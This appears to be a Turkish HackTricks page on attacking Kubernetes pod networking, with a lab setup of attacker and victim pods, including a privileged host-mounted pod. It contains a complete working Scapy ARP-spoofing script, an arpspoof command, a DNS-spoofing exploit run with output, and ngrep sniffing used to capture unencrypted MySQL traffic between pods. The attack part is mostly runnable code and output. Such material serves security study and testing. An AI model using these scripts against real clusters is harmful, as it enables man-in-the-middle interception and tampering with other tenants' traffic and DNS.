# Kubernetes Ağ Saldırıları

{{#include ../../banners/hacktricks-training.md}}

## Giriş

Kubernetes'te, **aynı düğümde bulunan tüm konteynerler arasında bağlantı kurulmasına izin veren varsayılan bir davranışın** gözlemlendiği belirtilmektedir. Bu, namespace farklılıklarına bakılmaksızın geçerlidir. Bu tür bir bağlantı, **Katman 2** (Ethernet) seviyesine kadar uzanır. Sonuç olarak, bu yapılandırma sistemi potansiyel olarak zafiyetlere maruz bırakmaktadır. Özellikle, bu durum **kötü niyetli bir konteynerin**, aynı düğümde bulunan diğer konteynerlere karşı bir **ARP sahtekarlığı saldırısı** gerçekleştirmesine olanak tanır. Böyle bir saldırı sırasında, kötü niyetli konteyner, diğer konteynerler için hedeflenen ağ trafiğini aldatıcı bir şekilde kesebilir veya değiştirebilir.

ARP sahtekarlığı saldırıları, **saldırganın yerel alan ağında sahte ARP** (Adres Çözümleme Protokolü) mesajları göndermesini içerir. Bu, **saldırganın MAC adresinin, ağdaki meşru bir bilgisayar veya sunucunun IP adresiyle ilişkilendirilmesine** yol açar. Böyle bir saldırının başarılı bir şekilde gerçekleştirilmesinin ardından, saldırgan verileri kesebilir, değiştirebilir veya hatta iletimdeki verileri durdurabilir. Saldırı, OSI modelinin Katman 2'sinde gerçekleştirilir, bu nedenle Kubernetes'teki bu katmandaki varsayılan bağlantı güvenlik endişeleri doğurmaktadır.

Senaryoda 4 makine oluşturulacak:

- ubuntu-pe: Düğüme kaçmak ve metrikleri kontrol etmek için ayrıcalıklı makine (saldırı için gerekli değil)
- **ubuntu-attack**: **Kötü niyetli** konteyner varsayılan namespace'te
- **ubuntu-victim**: kube-system namespace'inde **Kurban** makine
- **mysql**: varsayılan namespace'te **Kurban** makine
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
name: ubuntu-pe
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-pe
securityContext:
allowPrivilegeEscalation: true
privileged: true
runAsUser: 0
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never
hostIPC: true
hostNetwork: true
hostPID: true
volumes:
- name: host-volume
hostPath:
path: /
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-attack
labels:
app: ubuntu
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-attack
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-victim
namespace: kube-system
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-victim
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: mysql
spec:
containers:
- image: mysql:5.6
ports:
- containerPort: 3306
imagePullPolicy: IfNotPresent
name: mysql
env:
- name: MYSQL_ROOT_PASSWORD
value: mysql
restartPolicy: Never' | kubectl apply -f -
```

```bash
kubectl exec -it ubuntu-attack -- bash -c "apt update; apt install -y net-tools python3-pip python3 ngrep nano dnsutils; pip3 install scapy; bash"
kubectl exec -it ubuntu-victim -n kube-system -- bash -c "apt update; apt install -y net-tools curl netcat mysql-client; bash"
kubectl exec -it mysql bash -- bash -c "apt update; apt install -y net-tools; bash"
```
## Temel Kubernetes Ağı

Eğer burada tanıtılan ağ konuları hakkında daha fazla detay istiyorsanız, referanslara gidin.

### ARP

Genel olarak, **düğüm içindeki pod-pod ağı** tüm pod'ları bağlayan bir **köprü** aracılığıyla mevcuttur. Bu köprü “**cbr0**” olarak adlandırılır. (Bazı ağ eklentileri kendi köprülerini kuracaktır.) **cbr0 ayrıca ARP** (Adres Çözümleme Protokolü) çözümlemesi yapabilir. cbr0'a gelen bir paket geldiğinde, ARP kullanarak hedef MAC adresini çözümleyebilir.

Bu durum, varsayılan olarak, **aynı düğümde çalışan her pod'un** aynı düğümdeki herhangi bir diğer pod ile (namespace'den bağımsız olarak) ethernet seviyesinde (katman 2) **iletişim kurabileceği** anlamına gelir.

> [!WARNING]
> Bu nedenle, aynı düğümdeki podlar arasında A**RP Spoofing saldırıları gerçekleştirmek mümkündür.**

### DNS

Kubernetes ortamlarında genellikle kube-system namespace'inde 1 (veya daha fazla) **DNS hizmeti çalıştığını** bulacaksınız:
```bash
kubectl -n kube-system describe services
Name:              kube-dns
Namespace:         kube-system
Labels:            k8s-app=kube-dns
kubernetes.io/cluster-service=true
kubernetes.io/name=KubeDNS
Annotations:       prometheus.io/port: 9153
prometheus.io/scrape: true
Selector:          k8s-app=kube-dns
Type:              ClusterIP
IP Families:       <none>
IP:                10.96.0.10
IPs:               10.96.0.10
Port:              dns  53/UDP
TargetPort:        53/UDP
Endpoints:         172.17.0.2:53
Port:              dns-tcp  53/TCP
TargetPort:        53/TCP
Endpoints:         172.17.0.2:53
Port:              metrics  9153/TCP
TargetPort:        9153/TCP
Endpoints:         172.17.0.2:9153
```
Önceki bilgide ilginç bir şey görebilirsiniz, **servisin IP'si** **10.96.0.10** ama **servisi çalıştıran pod'un IP'si** **172.17.0.2.**

Herhangi bir pod'un içindeki DNS adresini kontrol ederseniz, şöyle bir şey bulacaksınız:
```
cat /etc/resolv.conf
nameserver 10.96.0.10
```
Ancak, pod **o adrese** nasıl ulaşacağını **bilmiyor** çünkü bu durumda **pod aralığı** 172.17.0.10/26.

Bu nedenle, pod **DNS isteklerini 10.96.0.10 adresine** gönderecek ve bu istek cbr0 tarafından **172.17.0.2**'ye **çevrilecektir**.

> [!WARNING]
> Bu, bir podun **DNS isteğinin** **her zaman** **servis IP'sini endpoint IP'sine çevirmek için** **köprüye** gideceği anlamına gelir, DNS sunucusu pod ile aynı alt ağda olsa bile.
>
> Bunu bilerek ve **ARP saldırılarının mümkün olduğunu** bilerek, bir **pod** bir düğümde **her podun** **alt ağdaki** ve **köprü** ile olan **trafiği** **yakalamak** ve DNS sunucusundan gelen **DNS yanıtlarını** **değiştirmek** için **yeteneğe** sahip olacaktır (**DNS Spoofing**).
>
> Dahası, eğer **DNS sunucusu** **saldırganla aynı düğümde** ise, saldırgan **kümedeki** herhangi bir podun **tüm DNS isteklerini** (DNS sunucusu ile köprü arasında) **yakalayabilir** ve yanıtları değiştirebilir.

## Aynı Düğümdeki Podlarda ARP Spoofing

Amacımız **en azından ubuntu-victim ile mysql arasındaki iletişimi çalmak**. 

### Scapy
```bash
python3 /tmp/arp_spoof.py
Enter Target IP:172.17.0.10 #ubuntu-victim
Enter Gateway IP:172.17.0.9 #mysql
Target MAC 02:42:ac:11:00:0a
Gateway MAC: 02:42:ac:11:00:09
Sending spoofed ARP responses

# Get another shell
kubectl exec -it ubuntu-attack -- bash
ngrep -d eth0

# Login from ubuntu-victim and mysql and check the unencrypted communication
# interacting with the mysql instance
```

```python:arp_spoof.py
#From https://gist.github.com/rbn15/bc054f9a84489dbdfc35d333e3d63c87#file-arpspoofer-py
from scapy.all import *

def getmac(targetip):
arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
return targetmac

def spoofarpcache(targetip, targetmac, sourceip):
spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
send(spoofed, verbose= False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
send(packet, verbose=False)
print("ARP Table restored to normal for", targetip)

def main():
targetip= input("Enter Target IP:")
gatewayip= input("Enter Gateway IP:")

try:
targetmac= getmac(targetip)
print("Target MAC", targetmac)
except:
print("Target machine did not respond to ARP broadcast")
quit()

try:
gatewaymac= getmac(gatewayip)
print("Gateway MAC:", gatewaymac)
except:
print("Gateway is unreachable")
quit()
try:
print("Sending spoofed ARP responses")
while True:
spoofarpcache(targetip, targetmac, gatewayip)
spoofarpcache(gatewayip, gatewaymac, targetip)
except KeyboardInterrupt:
print("ARP spoofing stopped")
restorearp(gatewayip, gatewaymac, targetip, targetmac)
restorearp(targetip, targetmac, gatewayip, gatewaymac)
quit()

if __name__=="__main__":
main()

# To enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward
```
### ARPSpoof
```bash
apt install dsniff
arpspoof -t 172.17.0.9 172.17.0.10
```
## DNS Spoofing

Daha önce belirtildiği gibi, eğer **DNS sunucu pod'unun aynı düğümünde bir pod'u ele geçirirseniz**, **ARPSpoofing** ile **bridge** ve **DNS** pod'u arasında **MitM** yapabilir ve **tüm DNS yanıtlarını** **değiştirebilirsiniz**.

Bunu test etmek için gerçekten güzel bir **tool** ve **tutorial** var [**https://github.com/danielsagi/kube-dnsspoof/**](https://github.com/danielsagi/kube-dnsspoof/)

Senaryomuzda, **attacker pod'unda** **tool'u indirin** ve **spoof** etmek istediğiniz **domain'lerle** birlikte **`hosts`** adında bir **dosya** oluşturun:
```
cat hosts
google.com. 1.1.1.1
```
Ubuntu-mağdur makinesine saldırıyı gerçekleştir:
```
python3 exploit.py --direct 172.17.0.10
[*] starting attack on direct mode to pod 172.17.0.10
Bridge:  172.17.0.1 02:42:bd:63:07:8d
Kube-dns:  172.17.0.2 02:42:ac:11:00:02

[+] Taking over DNS requests from kube-dns. press Ctrl+C to stop
```

```bash
#In the ubuntu machine
dig google.com
[...]
;; ANSWER SECTION:
google.com.		1	IN	A	1.1.1.1
```
> [!NOTE]
> Kendi DNS sahtekarlığı scriptinizi oluşturmaya çalışırsanız, eğer **sadece DNS yanıtını değiştirirseniz** bu **çalışmayacak**, çünkü **yanıt** **kötü niyetli** **podun** IP adresi olan bir **src IP** içerecek ve **kabul edilmeyecek**.\
> Kurbanın DNS isteğini gönderdiği **DNS**'nin **src IP**'si ile **yeni bir DNS paketi** oluşturmanız gerekiyor (bu, 172.16.0.2 gibi bir şeydir, 10.96.0.10 değil, bu K8s DNS hizmetinin IP'sidir ve DNS sunucusunun IP'si değildir, bununla ilgili daha fazla bilgi giriş bölümünde bulunmaktadır).

## Trafiği Yakalama

[**Mizu**](https://github.com/up9inc/mizu) aracı, mikro hizmetler arasındaki tüm API iletişimini **görmenizi** sağlayan basit ama güçlü bir API **trafik görüntüleyicisidir**. Bu, hata ayıklamanıza ve gerilemeleri çözmenize yardımcı olur.\
Seçilen podlarda ajanlar kuracak ve trafik bilgilerini toplayacak ve bunları bir web sunucusunda gösterecektir. Ancak, bunun için yüksek K8s izinlerine ihtiyacınız olacak (ve çok gizli değil).

## Referanslar

- [https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1](https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1)
- [https://blog.aquasec.com/dns-spoofing-kubernetes-clusters](https://blog.aquasec.com/dns-spoofing-kubernetes-clusters)

{{#include ../../banners/hacktricks-training.md}}
